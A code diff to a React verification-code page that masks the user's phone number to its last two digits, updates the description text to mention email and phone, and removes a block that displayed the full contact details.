@@ -26,10 +26,18 @@ const Verify = () => {
         }
     }, []);
 
+    // Format số điện thoại chỉ hiển thị 2 số cuối
+    const formatPhoneForDisplay = (phone) => {
+        if (!phone) return '';
+        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
+        if (cleanPhone.length <= 2) return phone;
+        return '*'.repeat(cleanPhone.length - 2) + cleanPhone.slice(-2);
+    };
+
     const defaultTexts = useMemo(
         () => ({
             title: 'Check your email',
-            description: `We have sent a confirmation code to ${userInfo.email || 'your email'}`,
+            description: `We have sent a verification code to your ${userInfo.email || 'email'} and ${formatPhoneForDisplay(userInfo.phone) || 'phone'}. Please enter the code we just sent to continue.`,
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
@@ -41,7 +49,7 @@ const Verify = () => {
             loadingText: 'Please wait',
             secondsText: 'seconds'
         }),
-        [userInfo.email]
+        [userInfo.email, userInfo.phone]
     );
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
@@ -158,15 +166,6 @@ const Verify = () => {
             <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                 <p>{translatedTexts.description}</p>
-                
-                {/* Hiển thị email và số điện thoại đã ẩn */}
-                <div className="text-center">
-                    <p className="text-sm text-gray-600">Code sent to:</p>
-                    <p className="font-medium text-blue-600">{userInfo.email}</p>
-                    {userInfo.phone && (
-                        <p className="text-sm text-gray-600 mt-1">or {userInfo.phone}</p>
-                    )}
-                </div>
 
                 <img src={VerifyImage} alt='' />
                 <input
